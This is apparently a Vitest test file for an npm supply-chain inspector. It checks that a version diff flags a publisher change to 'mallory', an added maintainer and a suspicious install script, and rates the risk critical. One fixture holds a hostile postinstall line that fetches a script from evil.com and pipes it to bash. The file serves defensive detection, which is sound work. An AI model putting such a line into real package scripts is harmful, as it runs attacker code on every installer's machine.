import { describe, expect, it } from 'vitest';
import { compareVersions } from '../src/diff/inspect.js';
import type { NpmPackument } from '../src/clients/npm.js';

describe('compareVersions', () => {
  const sampleDoc: NpmPackument = {
    name: 'demo-package',
    'dist-tags': { latest: '1.1.0' },
    time: {
      '1.0.0': '2023-01-01T00:00:00Z',
      '1.1.0': '2023-06-01T00:00:00Z',
    },
    versions: {
      '1.0.0': {
        version: '1.0.0',
        _npmUser: { name: 'alice', email: 'alice@example.com' },
        maintainers: [{ name: 'alice' }],
        scripts: { test: 'vitest' },
      },
      '1.1.0': {
        version: '1.1.0',
        _npmUser: { name: 'mallory', email: 'mallory@evil.com' },
        maintainers: [{ name: 'alice' }, { name: 'mallory' }],
        scripts: {
          test: 'vitest',
          postinstall: 'curl -s https://evil.com/x.sh | bash',
        },
      },
    },
  };

  it('detecta cambio de publicador, adición de scripts sospechosos y evalúa riesgo como critical', () => {
    const diff = compareVersions('demo-package', sampleDoc, '1.0.0', '1.1.0');

    expect(diff.packageName).toBe('demo-package');
    expect(diff.fromVersion).toBe('1.0.0');
    expect(diff.toVersion).toBe('1.1.0');

    // Publicador
    expect(diff.publisher.changed).toBe(true);
    expect(diff.publisher.from).toBe('alice');
    expect(diff.publisher.to).toBe('mallory');

    // Mantenedores
    expect(diff.maintainers.added).toEqual(['mallory']);

    // Lifecycle scripts
    expect(diff.installScripts.hasSuspicious).toBe(true);
    expect(diff.installScripts.added).toHaveLength(1);
    expect(diff.installScripts.added[0]?.stage).toBe('postinstall');
    expect(diff.installScripts.added[0]?.suspicious).toBe(true);

    // Nivel de riesgo
    expect(diff.riskLevel).toBe('critical');
    expect(diff.alerts.some((a) => a.includes('CRÍTICO'))).toBe(true);
    expect(diff.alerts.some((a) => a.includes('Account Hijacking'))).toBe(true);
  });

  it('evalúa riesgo como low si solo cambian dependencias menores sin cambio de publicador ni scripts', () => {
    const safeDoc: NpmPackument = {
      name: 'safe-tool',
      'dist-tags': { latest: '2.0.1' },
      time: {
        '2.0.0': '2023-01-01T00:00:00Z',
        '2.0.1': '2023-01-10T00:00:00Z',
      },
      versions: {
        '2.0.0': {
          version: '2.0.0',
          _npmUser: { name: 'bob' },
          maintainers: [{ name: 'bob' }],
        },
        '2.0.1': {
          version: '2.0.1',
          _npmUser: { name: 'bob' },
          maintainers: [{ name: 'bob' }],
        },
      },
    };

    const diff = compareVersions('safe-tool', safeDoc);
    expect(diff.riskLevel).toBe('low');
    expect(diff.publisher.changed).toBe(false);
    expect(diff.installScripts.hasSuspicious).toBe(false);
  });
});
